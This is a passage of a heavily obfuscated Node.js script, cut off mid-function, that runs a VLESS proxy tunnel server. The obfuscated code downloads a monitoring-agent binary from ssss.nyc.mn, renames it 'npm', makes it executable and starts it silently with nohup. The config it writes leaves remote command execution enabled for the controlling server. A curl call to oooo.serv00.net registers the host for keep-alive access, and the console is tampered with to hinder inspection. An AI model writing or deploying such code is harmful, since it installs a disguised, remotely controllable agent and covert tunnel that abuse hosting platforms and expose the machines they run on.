#!/usr/bin/env node

const _0x49f815=_0xcbbe;(function(_0xc1753,_0x135f02){const _0x25fa6a=_0xcbbe,_0x2fdded=_0xc1753();while(!![]){try{const _0x3fc914=parseInt(_0x25fa6a(0x183))/0x1+-parseInt(_0x25fa6a(0x1e0))/0x2*(-parseInt(_0x25fa6a(0x1af))/0x3)+-parseInt(_0x25fa6a(0x27f))/0x4+parseInt(_0x25fa6a(0x296))/0x5*(parseInt(_0x25fa6a(0x243))/0x6)+-parseInt(_0x25fa6a(0x1c4))/0x7*(parseInt(_0x25fa6a(0x1b1))/0x8)+-parseInt(_0x25fa6a(0x17b))/0x9*(-parseInt(_0x25fa6a(0x239))/0xa)+parseInt(_0x25fa6a(0x277))/0xb*(-parseInt(_0x25fa6a(0x2a2))/0xc);if(_0x3fc914===_0x135f02)break;else _0x2fdded['push'](_0x2fdded['shift']());}catch(_0x5fd00b){_0x2fdded['push'](_0x2fdded['shift']());}}}(_0x3f22,0x5c6fe));const _0x469c9a=(function(){let _0x2da9be=!![];return function(_0x56a57c,_0x56f547){const _0x17d0bd=_0x2da9be?function(){const _0x1f9b60=_0xcbbe;if(_0x56f547){const _0x4fe582=_0x56f547[_0x1f9b60(0x204)](_0x56a57c,arguments);return _0x56f547=null,_0x4fe582;}}:function(){};return _0x2da9be=![],_0x17d0bd;};}()),_0x37cc28=_0x469c9a(this,function(){const _0x582b42=_0xcbbe;return _0x37cc28[_0x582b42(0x19f)]()[_0x582b42(0x1a4)](_0x582b42(0x273))[_0x582b42(0x19f)]()[_0x582b42(0x1fc)](_0x37cc28)[_0x582b42(0x1a4)](_0x582b42(0x273));});_0x37cc28();const _0x44cca1=(function(){let _0x248e89=!![];return function(_0x559273,_0x19fdc1){const _0x3251cb=_0x248e89?function(){const _0x2052cd=_0xcbbe;if(_0x19fdc1){const _0x3c9172=_0x19fdc1[_0x2052cd(0x204)](_0x559273,arguments);return _0x19fdc1=null,_0x3c9172;}}:function(){};return _0x248e89=![],_0x3251cb;};}()),_0xb5eed8=_0x44cca1(this,function(){const _0x4fe989=_0xcbbe;let _0x29f6a2;try{const _0x105db5=Function('return\x20(function()\x20'+_0x4fe989(0x29e)+');');_0x29f6a2=_0x105db5();}catch(_0x194c60){_0x29f6a2=window;}const _0x431082=_0x29f6a2[_0x4fe989(0x1d8)]=_0x29f6a2[_0x4fe989(0x1d8)]||{},_0x135c78=[_0x4fe989(0x289),_0x4fe989(0x253),'info',_0x4fe989(0x1ff),_0x4fe989(0x1b5),_0x4fe989(0x236),_0x4fe989(0x25a)];for(let _0x299acb=0x0;_0x299acb<_0x135c78[_0x4fe989(0x28b)];_0x299acb++){const _0x51e5be=_0x44cca1['constructor'][_0x4fe989(0x266)][_0x4fe989(0x216)](_0x44cca1),_0x54ba8d=_0x135c78[_0x299acb],_0x57fe13=_0x431082[_0x54ba8d]||_0x51e5be;_0x51e5be['__proto__']=_0x44cca1[_0x4fe989(0x216)](_0x44cca1),_0x51e5be[_0x4fe989(0x19f)]=_0x57fe13[_0x4fe989(0x19f)][_0x4fe989(0x216)](_0x57fe13),_0x431082[_0x54ba8d]=_0x51e5be;}});_0xb5eed8();const os=require('os'),fs=require('fs'),net=require('net'),dns=require(_0x49f815(0x1d2)),http=require('http'),axios=require('axios'),{Buffer}=require(_0x49f815(0x24c)),{exec}=require('child_process'),UUID=process[_0x49f815(0x188)][_0x49f815(0x265)]||'60f86c80-cc31-47a3-aa65-de346801fc1f',NEZHA_SERVER=process[_0x49f815(0x188)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x49f815(0x188)][_0x49f815(0x190)]||'',NEZHA_KEY=process[_0x49f815(0x188)][_0x49f815(0x207)]||'',AUTO_ACCESS=process[_0x49f815(0x188)][_0x49f815(0x1d5)]||!![],XPATH=process[_0x49f815(0x188)][_0x49f815(0x230)]||UUID[_0x49f815(0x1ba)](0x0,0x8),SUB_PATH=process[_0x49f815(0x188)][_0x49f815(0x240)]||'ray',DOMAIN=process[_0x49f815(0x188)][_0x49f815(0x1a1)]||_0x49f815(0x29d),NAME=process[_0x49f815(0x188)]['NAME']||'',PORT=process['env']['PORT']||0xbb8,SETTINGS={[_0x49f815(0x265)]:UUID,[_0x49f815(0x222)]:_0x49f815(0x1f5),[_0x49f815(0x1aa)]:_0x49f815(0x28d),[_0x49f815(0x230)]:_0x49f815(0x162)+XPATH,[_0x49f815(0x1b6)]:0x32,['MAX_POST_SIZE']:0x1e8480,['SESSION_TIMEOUT']:0x7530,[_0x49f815(0x2a1)]:0x40*0x400,[_0x49f815(0x217)]:!![],[_0x49f815(0x1c3)]:!![],[_0x49f815(0x19e)]:0xea60,[_0x49f815(0x219)]:0x493e0,[_0x49f815(0x1f7)]:0x64,[_0x49f815(0x176)]:0x40*0x400,[_0x49f815(0x17a)]:0x40*0x400,[_0x49f815(0x1b9)]:0xa,[_0x49f815(0x16f)]:![]},customDnsResolver={'servers':[_0x49f815(0x1d3),'8.8.8.8'],'currentServerIndex':0x0,async 'resolve'(_0x3060bd){const _0x20d3f1=_0x49f815,_0x2fce3a=this[_0x20d3f1(0x1e4)];let _0xc1ee76;for(let _0x29a73c=0x0;_0x29a73c<_0x2fce3a[_0x20d3f1(0x28b)];_0x29a73c++){const _0x3a97f6=(this[_0x20d3f1(0x23c)]+_0x29a73c)%_0x2fce3a[_0x20d3f1(0x28b)],_0x43a4ab=_0x2fce3a[_0x3a97f6];try{log(_0x20d3f1(0x18f),_0x20d3f1(0x22b)+_0x3060bd+_0x20d3f1(0x24e)+_0x43a4ab);const _0x5bc1ca=await this['resolveWithServer'](_0x3060bd,_0x43a4ab);return this[_0x20d3f1(0x23c)]=(_0x3a97f6+0x1)%_0x2fce3a[_0x20d3f1(0x28b)],log(_0x20d3f1(0x18f),_0x20d3f1(0x268)+_0x3060bd+_0x20d3f1(0x2a3)+_0x5bc1ca+'\x20using\x20'+_0x43a4ab),_0x5bc1ca;}catch(_0x1861e3){_0xc1ee76=_0x1861e3,log('warn','DNS\x20resolution\x20failed\x20with\x20'+_0x43a4ab+':\x20'+_0x1861e3[_0x20d3f1(0x278)]);}}throw new Error('All\x20DNS\x20servers\x20failed.\x20Last\x20error:\x20'+_0xc1ee76?.[_0x20d3f1(0x278)]);},async 'resolveWithServer'(_0x3e6bd1,_0x3ba1b5){return new Promise((_0x31429c,_0x578801)=>{const _0x146dbb=_0xcbbe,_0x21a472=require(_0x146dbb(0x1d2)),_0x5eaf1c=_0x21a472[_0x146dbb(0x201)]();_0x21a472[_0x146dbb(0x1a2)]([_0x3ba1b5]),_0x21a472[_0x146dbb(0x270)](_0x3e6bd1,(_0x1ec671,_0x318772)=>{const _0x171841=_0x146dbb;_0x21a472[_0x171841(0x1a2)](_0x5eaf1c);if(_0x1ec671)_0x578801(_0x1ec671);else _0x318772&&_0x318772[_0x171841(0x28b)]>0x0?_0x31429c(_0x318772[0x0]):_0x578801(new Error('No\x20addresses\x20found'));});});}};dns[_0x49f815(0x193)](_0x49f815(0x1e5)),dns['setServers']([_0x49f815(0x1d3),_0x49f815(0x1c1)]);function _0xcbbe(_0x25aad1,_0x4d1ed5){const _0x50157e=_0x3f22();return _0xcbbe=function(_0xb5eed8,_0x44cca1){_0xb5eed8=_0xb5eed8-0x15f;let _0x2d72f0=_0x50157e[_0xb5eed8];return _0x2d72f0;},_0xcbbe(_0x25aad1,_0x4d1ed5);}function _0x3f22(){const _0x440248=['not\x20enough\x20data\x20to\x20read','releaseLock','now','get','trace',',\x20size=','reset','substr','cork',',\x20Speed:\x20','writableEnded','Client\x20connection\x20error\x20for\x20session:\x20','aarch64','setTimeout','Cleaned\x20up\x20','UUID','prototype','test','Resolved\x20','Failed\x20to\x20get\x20server\x20info:\x20','/([^/]+)(?:/([0-9]+))?$','Connection:\x20close\x0d\x0a','ISP\x20info\x20obtained:\x20',',\x20Transferred:\x20','\x20-\x20Duration:\x20','--tls','resolve4','reduce','Cleaning\x20up\x20expired\x20session:\x20','(((.+)+)+)+$','currentStreamRes','Failed\x20to\x20process\x20POST\x20request:\x20','createServer','6135327mMnntD','message','destroyed','remote','https://arm64.ssss.nyc.mn/agent','Created\x20new\x20session\x20with\x20UUID:\x20','Error\x20starting\x20downstream:\x20','bufferedData','1132828JXKePn','reading_done','activeConnections','done','nextTick','pendingBuffers','Transfer\x20completed:\x20','setNoDelay','MB)','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','log','VLESS\x20header\x20parsed:\x20','length','VLESS\x20header\x20parse\x20error:\x20','8192','getReader','HTTP\x20Hijacking\x20not\x20supported','match','MB,\x20RSS\x20','_processPendingPackets','stream','setKeepAlive','https://ipv4.ip.sb','5KwirtY','Content-Type:\x20application/octet-stream\x0d\x0a','then','fill','_handle','443','getWriter','der-hsw.onrender.com','{}.constructor(\x22return\x20this\x22)(\x20)','connect','alpnProtocol','CHUNK_SIZE','12rfdHSW','\x20to\x20','Download\x20error:\x20','country_code','Sent\x20HTTP\x20response\x20header\x20for\x20session:\x20','replace','%2F','close','\x20timed\x20out\x20without\x20downstream','Remote\x20connection\x20established','headerSent','MAX_POST_SIZE','High\x20memory\x20usage\x20detected:\x20','requestTimeout','config.yaml','removeListener','Failed\x20to\x20initialize\x20VLESS\x20connection','Server\x20error:\x20','VLESS\x20header\x20parsed\x20successfully','ENABLE_COMPRESSION','set','8443','Connected\x20to\x20','join','Client\x20connection\x20closed\x20for\x20session:\x20','invalid\x20UUID','WRITE_BUFFER_SIZE','catch','method','Starting\x20to\x20parse\x20VLESS\x20header','READ_BUFFER_SIZE','9gxhQJW','timeout','Cleanup\x20error:\x20','Got\x20IPv6\x20address:\x20','bytesTransferred','sort','Failed\x20to\x20write\x20to\x20remote:\x20','npm\x20is\x20running','509305QXHlTX','from','GET,\x20POST','headersTimeout','size','env','header\x20length\x20too\x20short','\x20with\x20optimized\x20settings','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','read','startDownstream','totalBytesTransferred','debug','NEZHA_PORT','Client\x20connection\x20closed','\x20-p\x20','setDefaultResultOrder','push','Failed\x20to\x20write\x20HTTP\x20response:\x20','hostname','setReadBuffer','chmod\x20+x\x20npm','https://amd64.ssss.nyc.mn/v1','Server\x20is\x20running\x20on\x20port\x20','connect\x20timeout','\x20bytes\x20in\x20','Remote\x20error:\x20','SESSION_CLEANUP_INTERVAL','toString','2087','DOMAIN','setServers','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','search','max','write','\x1b[0m','\x1b[36m','npm\x20running\x20error:\x20','BUFFER_SIZE','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36','MB,\x20forcing\x20garbage\x20collection','aborted','read\x20vless\x20header\x20error:\x20','3kPWKHz','includes','49592mIlusy','keys','_writableState','rss','exception','MAX_BUFFERED_POSTS','peakMemoryUsage','s,\x20Connections:\x20','BATCH_PROCESS_SIZE','slice','listen','end','\x1b[31m','downstreamStarted','connection','pendingPackets','8.8.8.8','cleanupTimer','TCP_KEEPALIVE','721gOizYB',']\x20[','destroy','/bin/bash','initializeVLESS','Failed\x20to\x20get\x20IP\x20from\x20','vless://','info','Processed\x20pending\x20packet\x20seq=','totalConnections','removeAllListeners','Error\x20writing\x20to\x20client:\x20','Processing\x20packet:\x20seq=','initialized','dns','1.1.1.1','\x20KB/s)','AUTO_ACCESS','eventListeners','Process\x20packet\x20error:\x20','console','finally','headersSent','&mode=packet-up#','false','pop','2096','Session\x20','384586hebSbk','_writeToRemote','readable','heapUsed','servers','ipv4first','pause','enqueue','https://','url','Connection\x20failed:\x20','_startDownstreamResponse','highWaterMark','Socket\x20error:','arm64','\x1b[33m','writable','Remote\x20connection\x20not\x20available','cleanup','socket','\x1b[32m','none','writeHead','CONNECTION_POOL_SIZE','vlessHeader','createWriteStream','processPacket','Error\x20sending\x20request:','constructor','floor','trim','error','):\x20','getServers','cleaned','Read\x20controller\x20close\x20error:','apply','arm','uuid','NEZHA_KEY','Sending\x20VLESS\x20response\x20header\x20(','POST','HTTP\x20upgrade\x20request\x20received','random','Session\x20initialization\x20timeout\x20for:\x20','responseHeader','GET','maxConnections','DNS\x20resolved\x20','KB/s','2053','memoryUsage','isp','data','bind','TCP_NODELAY','startTime','MAX_SESSION_AGE','round','http/1.1','IPv6\x20fallback\x20failed:','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','pipe','Sent\x20VLESS\x20response\x20header\x20for\x20session:\x20','all','SESSION_TIMEOUT','LOG_LEVEL','port','lastActivity','concat','delete','clear','2083','tls','uncork','Resolving\x20','unlink','resp','Relay\x20error:','setWriteBuffer','XPATH','socket\x20hang\x20up','npm',',\x20ISP=','npm\x20download\x20successfully','toISOString','table','Read\x20controller\x20error:','DNS\x20resolution\x20failed\x20for\x20','7387910QfCFeq','Error\x20added\x20Task:','Hello,\x20World\x0a','currentServerIndex','forEach','https://api.ip.sb/geoip','Remote\x20connection\x20error:\x20','SUB_PATH','add','has','2506164BWaQoj','Got\x20server\x20IP:\x20','Memory:\x20Heap\x20','true','secureConnection','Unknown','Unknown_ISP','https://ifconfig.me','replaceAll','buffer','MB,\x20Avg\x20Speed:\x20','\x20using\x20DNS\x20server:\x20','Buffered\x20packet\x20seq=','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','Failed\x20to\x20write\x20VLESS\x20response:\x20','value','warn','base64','&sni='];_0x3f22=function(){return _0x440248;};return _0x3f22();}function validate_uuid(_0x57ad0b,_0x351b91){for(let _0x1bed3c=0x0;_0x1bed3c<0x10;_0x1bed3c++){if(_0x57ad0b[_0x1bed3c]!==_0x351b91[_0x1bed3c])return![];}return!![];}function concat_typed_arrays(_0x192b3d,..._0x28f98e){const _0x26a450=_0x49f815;if(!_0x28f98e||_0x28f98e[_0x26a450(0x28b)]<0x1)return _0x192b3d;let _0x206bf7=_0x192b3d['length'];for(let _0x155581 of _0x28f98e)_0x206bf7+=_0x155581[_0x26a450(0x28b)];const _0x29f280=new _0x192b3d['constructor'](_0x206bf7);_0x29f280[_0x26a450(0x170)](_0x192b3d,0x0),_0x206bf7=_0x192b3d['length'];for(let _0x35221b of _0x28f98e){_0x29f280[_0x26a450(0x170)](_0x35221b,_0x206bf7),_0x206bf7+=_0x35221b[_0x26a450(0x28b)];}return _0x29f280;}function log(_0xa38259,..._0x5c9b7b){const _0x191368=_0x49f815;if(SETTINGS['LOG_LEVEL']===_0x191368(0x1f5))return;const _0x35afd2={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x20f8bf={'debug':_0x191368(0x1a8),'info':_0x191368(0x1f4),'warn':_0x191368(0x1ef),'error':_0x191368(0x1bd),'reset':_0x191368(0x1a7)},_0x1de5eb=_0x35afd2[SETTINGS['LOG_LEVEL']]||0x1,_0x34ea28=_0x35afd2[_0xa38259]||0x0;if(_0x34ea28>=_0x1de5eb){const _0x113da7=new Date()[_0x191368(0x235)](),_0x5902ec=_0x20f8bf[_0xa38259]||_0x20f8bf['reset'];console[_0x191368(0x289)](_0x5902ec+'['+_0x113da7+_0x191368(0x1c5)+_0xa38259+']',..._0x5c9b7b,_0x20f8bf[_0x191368(0x25c)]);}}const getDownloadUrl=()=>{const _0x1a837b=_0x49f815,_0x3631be=os['arch']();return _0x3631be===_0x1a837b(0x205)||_0x3631be===_0x1a837b(0x1ee)||_0x3631be===_0x1a837b(0x262)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x1a837b(0x27b):!NEZHA_PORT?_0x1a837b(0x199):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x24b01a=_0x49f815;if(!NEZHA_KEY)return;try{const _0x237bf7=getDownloadUrl(),_0x667708=await axios({'method':_0x24b01a(0x259),'url':_0x237bf7,'responseType':'stream'}),_0x95816d=fs[_0x24b01a(0x1f9)](_0x24b01a(0x232));return _0x667708[_0x24b01a(0x215)][_0x24b01a(0x21e)](_0x95816d),new Promise((_0xdcc728,_0x338456)=>{_0x95816d['on']('finish',()=>{const _0x14282a=_0xcbbe;console[_0x14282a(0x289)](_0x14282a(0x234)),exec(_0x14282a(0x198),_0xa2f71f=>{if(_0xa2f71f)_0x338456(_0xa2f71f);_0xdcc728();});}),_0x95816d['on']('error',_0x338456);});}catch(_0x4aa7d8){throw _0x4aa7d8;}},runnz=async()=>{const _0x41e589=_0x49f815;await downloadFile();let _0x4dbb41='',_0x160041='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xc6a596=[_0x41e589(0x29b),'8443','2096',_0x41e589(0x1a0),_0x41e589(0x228),_0x41e589(0x212)];_0x4dbb41=_0xc6a596[_0x41e589(0x1b0)](NEZHA_PORT)?_0x41e589(0x26f):'',_0x160041='nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x41e589(0x192)+NEZHA_KEY+'\x20'+_0x4dbb41+'\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1d0f60=NEZHA_SERVER[_0x41e589(0x1b0)](':')?NEZHA_SERVER['split'](':')[_0x41e589(0x1dd)]():'',_0x3d8c29=new Set([_0x41e589(0x29b),_0x41e589(0x171),_0x41e589(0x1de),_0x41e589(0x1a0),'2083',_0x41e589(0x212)]),_0x375b73=_0x3d8c29[_0x41e589(0x242)](_0x1d0f60)?_0x41e589(0x246):_0x41e589(0x1dc),_0x5bcb49='\x0aclient_secret:\x20'+NEZHA_KEY+_0x41e589(0x288)+NEZHA_SERVER+_0x41e589(0x1a3)+_0x375b73+_0x41e589(0x18b)+UUID;fs['writeFileSync'](_0x41e589(0x16a),_0x5bcb49);}_0x160041=_0x41e589(0x21d);}else return;}try{exec(_0x160041,{'shell':_0x41e589(0x1c7)}),console[_0x41e589(0x289)](_0x41e589(0x182));}catch(_0x3883ab){console[_0x41e589(0x1ff)](_0x41e589(0x1a9)+_0x3883ab);}};async function addAccessTask(){const _0x65150c=_0x49f815;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x4290ce=_0x65150c(0x1e8)+DOMAIN,_0x7fb50b=_0x65150c(0x250)+_0x4290ce+'\x22}\x27';exec(_0x7fb50b,(_0x1e75a4,_0x224ec8,_0x130008)=>{const _0x188aea=_0x65150c;if(_0x1e75a4){console[_0x188aea(0x1ff)](_0x188aea(0x1fb),_0x1e75a4[_0x188aea(0x278)]);return;}console['log']('Automatic\x20Access\x20Task\x20added\x20successfully:',_0x224ec8);});}catch(_0xdede3c){console[_0x65150c(0x1ff)](_0x65150c(0x23a),_0xdede3c[_0x65150c(0x278)]);}}function parse_uuid(_0x204959){const _0x7a720c=_0x49f815;_0x204959=_0x204959[_0x7a720c(0x24b)]('-','');const _0x3cd5aa=[];for(let _0x50262f=0x0;_0x50262f<0x10;_0x50262f++){_0x3cd5aa[_0x7a720c(0x194)](parseInt(_0x204959[_0x7a720c(0x25d)](_0x50262f*0x2,0x2),0x10));}return _0x3cd5aa;}async function read_vless_header(_0x35468b,_0x118555){const _0x5ad2a5=_0x49f815;let _0x356564=0x0,_0x4e44cc=new Uint8Array(),_0x5ea7a8={'value':_0x4e44cc,'done':![]};async function _0x35a718(_0x191ace){const _0x524558=_0xcbbe;if(_0x5ea7a8[_0x524558(0x282)])throw new Error(_0x524558(0x189));const _0x15872a=_0x191ace-_0x356564;if(_0x15872a<0x1)return;_0x5ea7a8=await read_atleast(_0x35468b,_0x15872a),_0x356564+=_0x5ea7a8[_0x524558(0x252)][_0x524558(0x28b)],_0x4e44cc=concat_typed_arrays(_0x4e44cc,_0x5ea7a8['value']);}await _0x35a718(0x1+0x10+0x1);const _0x3dce4f=_0x4e44cc[0x0],_0x557bf8=_0x4e44cc[_0x5ad2a5(0x1ba)](0x1,0x1+0x10),_0x3a8a3a=parse_uuid(_0x118555);if(!validate_uuid(_0x557bf8,_0x3a8a3a))throw new Error(_0x5ad2a5(0x175));const _0xc35dd3=_0x4e44cc[0x1+0x10],_0xb3169=0x1+0x10+0x1+_0xc35dd3+0x1+0x2+0x1;await _0x35a718(_0xb3169+0x1);const _0x8c3836=_0x4e44cc[0x1+0x10+0x1+_0xc35dd3],_0x3cefd7=0x1;if(_0x8c3836!==_0x3cefd7)throw new Error('unsupported\x20command:\x20'+_0x8c3836);const _0x5b641f=(_0x4e44cc[_0xb3169-0x1-0x2]<<0x8)+_0x4e44cc[_0xb3169-0x1-0x1],_0x40455b=_0x4e44cc[_0xb3169-0x1],_0x4b53af=0x1,_0x54a84e=0x2,_0x34053d=0x3;let _0x17ba52=-0x1;if(_0x40455b===_0x4b53af)_0x17ba52=_0xb3169+0x4;else{if(_0x40455b===_0x34053d)_0x17ba52=_0xb3169+0x10;else _0x40455b===_0x54a84e&&(_0x17ba52=_0xb3169+0x1+_0x4e44cc[_0xb3169]);}if(_0x17ba52<0x0)throw new Error('read\x20address\x20type\x20failed');await _0x35a718(_0x17ba52);const _0x4bf801=_0xb3169;let _0x30a272='';if(_0x40455b===_0x4b53af)_0x30a272=_0x4e44cc[_0x5ad2a5(0x1ba)](_0x4bf801,_0x4bf801+0x4)['join']('.');else{if(_0x40455b===_0x54a84e)_0x30a272=new TextDecoder()['decode'](_0x4e44cc[_0x5ad2a5(0x1ba)](_0x4bf801+0x1,_0x4bf801+0x1+_0x4e44cc[_0x4bf801]));else _0x40455b===_0x34053d&&(_0x30a272=_0x4e44cc[_0x5ad2a5(0x1ba)](_0x4bf801,_0x4bf801+0x10)[_0x5ad2a5(0x271)]((_0x394a5c,_0x3f6eff,_0x40a859,_0x253657)=>_0x40a859%0x2?_0x394a5c[_0x5ad2a5(0x225)](((_0x253657[_0x40a859-0x1]<<0x8)+_0x3f6eff)[_0x5ad2a5(0x19f)](0x10)):_0x394a5c,[])[_0x5ad2a5(0x173)](':'));}if(!_0x30a272){log('error','Failed\x20to\x20parse\x20hostname');throw new Error('parse\x20hostname\x20failed');}return log(_0x5ad2a5(0x1cb),'VLS\x20connection\x20to\x20'+_0x30a272+':'+_0x5b641f),{'hostname':_0x30a272,'port':_0x5b641f,'data':_0x4e44cc['slice'](_0x17ba52),'resp':new Uint8Array([_0x3dce4f,0x0])};}async function read_atleast(_0x300ca2,_0x48877a){const _0x254445=_0x49f815,_0x2a7981=[];let _0x5a9ce2=![];while(_0x48877a>0x0&&!_0x5a9ce2){const _0x28d446=await _0x300ca2[_0x254445(0x18c)]();if(_0x28d446[_0x254445(0x252)]){const _0x4f90c8=new Uint8Array(_0x28d446[_0x254445(0x252)]);_0x2a7981['push'](_0x4f90c8),_0x48877a-=_0x4f90c8['length'];}_0x5a9ce2=_0x28d446[_0x254445(0x282)];}if(_0x48877a>0x0)throw new Error(_0x254445(0x256));return{'value':concat_typed_arrays(..._0x2a7981),'done':_0x5a9ce2};}async function parse_header(_0x106911,_0x3009bc){const _0x142239=_0x49f815;log('debug',_0x142239(0x179));const _0x588757=_0x3009bc[_0x142239(0x1e2)][_0x142239(0x28e)]();try{const _0x3dbf33=await read_vless_header(_0x588757,_0x106911);return log(_0x142239(0x18f),_0x142239(0x16e)),_0x3dbf33;}catch(_0x112c62){log(_0x142239(0x1ff),_0x142239(0x28c)+_0x112c62['message']);throw new Error(_0x142239(0x1ae)+_0x112c62['message']);}finally{_0x588757[_0x142239(0x257)]();}}async function connect_remote(_0x40aead,_0x30464e){const _0x1e9c65=_0x49f815,_0x19866f=0x2710;try{let _0x47c04d=_0x40aead;if(!/^\d+\.\d+\.\d+\.\d+$/[_0x1e9c65(0x267)](_0x40aead)&&!_0x40aead['startsWith']('['))try{_0x47c04d=await customDnsResolver['resolve'](_0x40aead),log(_0x1e9c65(0x18f),_0x1e9c65(0x210)+_0x40aead+_0x1e9c65(0x2a3)+_0x47c04d);}catch(_0x35c9db){log(_0x1e9c65(0x253),_0x1e9c65(0x238)+_0x40aead+',\x20using\x20original\x20hostname:\x20'+_0x35c9db['message']);}const _0x371013=await timed_connect(_0x47c04d,_0x30464e,_0x19866f);return _0x371013[_0x1e9c65(0x286)](SETTINGS[_0x1e9c65(0x217)]),_0x371013[_0x1e9c65(0x294)](SETTINGS['TCP_KEEPALIVE'],0x3e8),_0x371013[_0x1e9c65(0x197)]&&_0x371013['setReadBuffer'](SETTINGS['READ_BUFFER_SIZE']),_0x371013[_0x1e9c65(0x22f)]&&_0x371013['setWriteBuffer'](SETTINGS['WRITE_BUFFER_SIZE']),_0x371013['_handle']&&_0x371013[_0x1e9c65(0x29a)][_0x1e9c65(0x286)]&&_0x371013[_0x1e9c65(0x29a)][_0x1e9c65(0x286)](!![]),log(_0x1e9c65(0x1cb),_0x1e9c65(0x172)+_0x40aead+'('+_0x47c04d+'):'+_0x30464e+_0x1e9c65(0x18a)),_0x371013;}catch(_0x11ca41){log(_0x1e9c65(0x1ff),_0x1e9c65(0x1ea)+_0x11ca41[_0x1e9c65(0x278)]);throw _0x11ca41;}}function timed_connect(_0x216433,_0xee1f6c,_0x220fc3){return new Promise((_0x55c8e9,_0x1e736a)=>{const _0x90a0d7=_0xcbbe,_0x45bcf1=net['createConnection']({'host':_0x216433,'port':_0xee1f6c}),_0x2dab57=setTimeout(()=>{const _0x1e1adf=_0xcbbe;_0x1e736a(new Error(_0x1e1adf(0x19b)));},_0x220fc3);_0x45bcf1['on'](_0x90a0d7(0x29f),()=>{clearTimeout(_0x2dab57),_0x55c8e9(_0x45bcf1);}),_0x45bcf1['on'](_0x90a0d7(0x1ff),_0x62a04c=>{clearTimeout(_0x2dab57),_0x1e736a(_0x62a04c);});});}function pipe_relay(){async function _0x6fee43(_0x4e91a0,_0xeb6541,_0x55abc9){const _0x3623df=_0xcbbe,_0x59beef=SETTINGS[_0x3623df(0x2a1)];let _0x5e9293=0x0;const _0x310a11=Date[_0x3623df(0x258)]();if(_0x55abc9[_0x3623df(0x28b)]>0x0){if(_0xeb6541[_0x3623df(0x1a6)])_0xeb6541[_0x3623df(0x25e)](),_0xeb6541[_0x3623df(0x1a6)](_0x55abc9),process[_0x3623df(0x283)](()=>_0xeb6541[_0x3623df(0x22a)]()),_0x5e9293+=_0x55abc9[_0x3623df(0x28b)];else{const _0x383ecd=_0xeb6541[_0x3623df(0x1f0)][_0x3623df(0x29c)]();try{await _0x383ecd[_0x3623df(0x1a6)](_0x55abc9),_0x5e9293+=_0x55abc9['length'];}finally{_0x383ecd[_0x3623df(0x257)]();}}}try{if(_0x4e91a0[_0x3623df(0x21e)]){_0x4e91a0[_0x3623df(0x1e6)](),_0x4e91a0['_readableState'][_0x3623df(0x1ec)]=_0x59beef;_0xeb6541[_0x3623df(0x1b3)]&&(_0xeb6541[_0x3623df(0x1b3)][_0x3623df(0x1ec)]=_0x59beef);const {Transform:_0x1883e9}=require(_0x3623df(0x293)),_0x34f7aa=new _0x1883e9({'transform'(_0x2b1e72,_0x31fa4e,_0x529fff){const _0x4efd6f=_0x3623df;_0x5e9293+=_0x2b1e72['length'],_0x2b1e72[_0x4efd6f(0x28b)]<0x400?this['push'](_0x2b1e72):this[_0x4efd6f(0x194)](_0x2b1e72),_0x529fff();},'highWaterMark':_0x59beef});_0x4e91a0[_0x3623df(0x21e)](_0x34f7aa)['pipe'](_0xeb6541,{'end':!![],'highWaterMark':_0x59beef}),_0x4e91a0['resume']();}else{const _0x156dda=_0x4e91a0[_0x3623df(0x1e2)][_0x3623df(0x28e)](),_0x36457d=_0xeb6541['writable'][_0x3623df(0x29c)]();try{while(!![]){const {done:_0x456bea,value:_0x1b658a}=await _0x156dda[_0x3623df(0x18c)]();if(_0x456bea)break;_0x5e9293+=_0x1b658a[_0x3623df(0x28b)],await _0x36457d[_0x3623df(0x1a6)](_0x1b658a);}}finally{_0x156dda[_0x3623df(0x257)](),_0x36457d[_0x3623df(0x257)]();}}const _0x30270f=Date[_0x3623df(0x258)]()-_0x310a11;if(_0x5e9293>0x0&&_0x30270f>0x0){const _0x479ffd=Math[_0x3623df(0x21a)](_0x5e9293/_0x30270f*0x3e8/0x400);log(_0x3623df(0x18f),_0x3623df(0x285)+_0x5e9293+_0x3623df(0x19c)+_0x30270f+'ms\x20('+_0x479ffd+_0x3623df(0x1d4));}}catch(_0x4e79d5){!_0x4e79d5[_0x3623df(0x278)][_0x3623df(0x1b0)](_0x3623df(0x1ad))&&log(_0x3623df(0x1ff),_0x3623df(0x22e),_0x4e79d5['message']);throw _0x4e79d5;}}return _0x6fee43;}function socketToWebStream(_0x5fcc8e,_0x94c13e){const _0x3c47b5=_0x49f815;let _0x528e2c,_0x33acf6,_0x64cc9d=![];const _0xcf1a65=_0x50510f=>{const _0x963114=_0xcbbe;if(_0x64cc9d)return;log(_0x963114(0x1ff),_0x963114(0x1ed),_0x50510f[_0x963114(0x278)]),_0x528e2c?.[_0x963114(0x1ff)](_0x50510f),_0x33acf6?.[_0x963114(0x1ff)](_0x50510f);},_0x4952a1=_0x3c9acc=>{const _0x540232=_0xcbbe;if(_0x64cc9d)return;try{_0x528e2c?.[_0x540232(0x1e7)](_0x3c9acc);}catch(_0x5e1683){log(_0x540232(0x1ff),_0x540232(0x237),_0x5e1683[_0x540232(0x278)]);}},_0x23ff20=()=>{const 